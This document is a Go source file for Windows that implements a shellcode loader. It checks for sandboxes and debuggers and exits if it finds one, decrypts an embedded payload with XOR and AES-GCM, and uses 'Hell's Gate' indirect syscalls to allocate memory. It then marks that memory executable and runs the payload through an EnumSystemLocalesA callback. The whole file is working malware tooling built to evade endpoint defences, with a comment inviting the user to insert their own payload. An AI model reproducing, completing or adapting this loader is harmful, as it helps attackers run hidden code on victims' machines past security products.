//go:build windows
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// indirectSyscall links to the ASM stub
func indirectSyscall(ssn uint16, syscallAddr uintptr, handle uintptr, addr *uintptr, zeroBits uintptr, size *uintptr, allocType uintptr, protect uintptr) uintptr

var (
	k32 = syscall.NewLazyDLL("kernel32.dll")
	nt  = syscall.NewLazyDLL("ntdll.dll")

	vProtect      = k32.NewProc("VirtualProtect")
	rtlMoveMemory = nt.NewProc("RtlMoveMemory")
	enumLocales   = k32.NewProc("EnumSystemLocalesA")
)

// checkEnvironment performs basic sandbox evasion
func checkEnvironment() {
	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}
	start := time.Now()
	time.Sleep(50 * time.Millisecond)
	if time.Since(start) < 50*time.Millisecond {
		os.Exit(0)
	}
	isDebugger := k32.NewProc("IsDebuggerPresent")
	if res, _, _ := isDebugger.Call(); res != 0 {
		os.Exit(0)
	}
}

// resolveSyscall implements "Hell's Gate" logic to find SSN and Syscall address
func resolveSyscall(proc *syscall.LazyProc) (uint16, uintptr, error) {
	ptr := proc.Addr()
	if ptr == 0 {
		return 0, 0, errors.New("could not resolve proc address")
	}

	// Standard NTAPI stub check: mov eax, <SSN> (B8 XX XX XX XX)
	// The SSN is usually 4 bytes into the function
	ssn := *(*uint16)(unsafe.Pointer(ptr + 4))

	// Search for the 'syscall' opcode (0F 05) within the first 32 bytes
	var syscallAddr uintptr
	for i := 0; i < 32; i++ {
		b1 := *(*byte)(unsafe.Pointer(ptr + uintptr(i)))
		b2 := *(*byte)(unsafe.Pointer(ptr + uintptr(i+1)))
		if b1 == 0x0F && b2 == 0x05 {
			syscallAddr = ptr + uintptr(i)
			break
		}
	}

	if syscallAddr == 0 {
		return 0, 0, errors.New("syscall instruction not found")
	}

	return ssn, syscallAddr, nil
}

// unpack handles AES-256-GCM and XOR de-obfuscation with safety checks
func unpack(data []byte, aesKey []byte, xorKey byte) ([]byte, error) {
	if len(aesKey) != 32 {
		return nil, errors.New("invalid AES key length (must be 32)")
	}

	for i := range data {
		data[i] ^= xorKey
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, errors.New("payload too short for nonce")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func main() {
	checkEnvironment()

	// Replace with your actual packed payload and 32-byte key
	packedPayload := []byte{ /* ... */ }
	aesKey := []byte("32-byte-key-for-aes-256-standard")
	xorKey := byte(0xFF)

	if len(packedPayload) == 0 {
		return
	}

	decrypted, err := unpack(packedPayload, aesKey, xorKey)
	if err != nil || len(decrypted) == 0 {
		return
	}

	// Dynamic Resolution via Hell's Gate
	ntAlloc := nt.NewProc("NtAllocateVirtualMemory")
	ssn, syscallInst, err := resolveSyscall(ntAlloc)
	if err != nil {
		return
	}

	var baseAddress uintptr
	size := uintptr(len(decrypted))

	// Indirect Syscall: NtAllocateVirtualMemory (0xffffffffffffffff = Current Process)
	status := indirectSyscall(ssn, syscallInst, uintptr(0xffffffffffffffff), &baseAddress, 0, &size, 0x3000, 0x04)
	if status != 0 {
		return
	}

	// Move decrypted data to manual buffer
	_, _, _ = rtlMoveMemory.Call(baseAddress, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))

	// Protect: Transition to PAGE_EXECUTE_READ (0x20)
	var oldProtect uint32
	if ret, _, _ := vProtect.Call(baseAddress, uintptr(len(decrypted)), 0x20, uintptr(unsafe.Pointer(&oldProtect))); ret == 0 {
		return
	}

	// Execute via System Callback
	_, _, _ = enumLocales.Call(baseAddress, 0)
}
